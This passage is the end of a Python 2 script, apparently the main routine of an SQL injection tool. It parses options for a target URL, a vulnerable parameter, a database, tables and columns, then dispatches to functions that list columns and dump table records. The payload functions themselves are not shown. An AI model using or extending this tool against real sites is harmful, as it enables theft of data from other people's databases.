            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/ --data=index.php?id=1 -D abc --tables)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass

    elif options.url and options.data and options.db and options.tbl and not options.col:
        
        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        data = options.data
        Db = options.db
        Tbl = options.tbl
        PathToTheOutput(tgt)
        
        if ret == 'columns':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:

                HTTPResponses(tgt, data)
                dumpCols(tgt, data, Db, Tbl)
                
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            
        else:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/ --data=index.php?id=1 -D abc -T abc --columns)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass


    elif options.url and options.data and options.db and options.tbl and options.col:

        if 'http://' in options.url:
            tgt = options.url
        elif 'https://' in options.url:
            tgt = options.url
        else:
            tgt = 'http://%s' % (options.url)
            
        Db = options.db
        Tbl = options.tbl
        colList = str(options.col).split(',')
        data = options.data
        PathToTheOutput(tgt)
        DumpedDb(Db,Tbl)
        if ret == 'dump':
            xpbanner()
            print fg + sb + "\n[*] starting at "+strftime("%H:%M:%S")+"\n"
            try:
                
                HTTPResponses(tgt, data)
                dumpTblRecords(tgt, data, Db, Tbl, colList)
                
            except KeyboardInterrupt:
                print fr + sn + '['+strftime("%H:%M:%S")+'] [ERROR] user aborted'
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"    
                sys.exit(0)
            else:
                print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
                
        else:
            print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] Please insert options (e.g: http://www.example.com/ --data=index.php?id=1 -D abc -T abc -C a,b,c --dump)"
            print fw + sn + "\n[*] shutting down at "+strftime("%H:%M:%S")+"\n"
            pass
            
    else:
        pass
if __name__ == "__main__":
	Main()
